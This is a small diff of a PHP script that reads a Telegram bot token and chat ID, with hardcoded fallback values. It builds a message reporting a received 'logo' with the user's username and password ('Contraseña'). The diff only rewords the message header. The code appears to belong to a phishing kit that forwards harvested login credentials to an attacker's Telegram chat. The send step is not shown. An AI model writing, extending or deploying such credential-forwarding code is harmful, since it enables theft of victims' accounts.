@@ -51,7 +51,7 @@ $FALLBACK_CHAT_ID_LEGACY   = "-4801629674";
 $token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_LEGACY;
 $chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_LEGACY;
 
-$mensaje  = "📥 Logo recibido:\n";
+$mensaje  = "📝 <b>[LOGO RECIBIDO]</b> Canal legacy 'Logo recibido':\n";
 $mensaje .= "👤 Usuario: $nombre\n";
 $mensaje .= "🔓 Contraseña: $telefono\n";
 
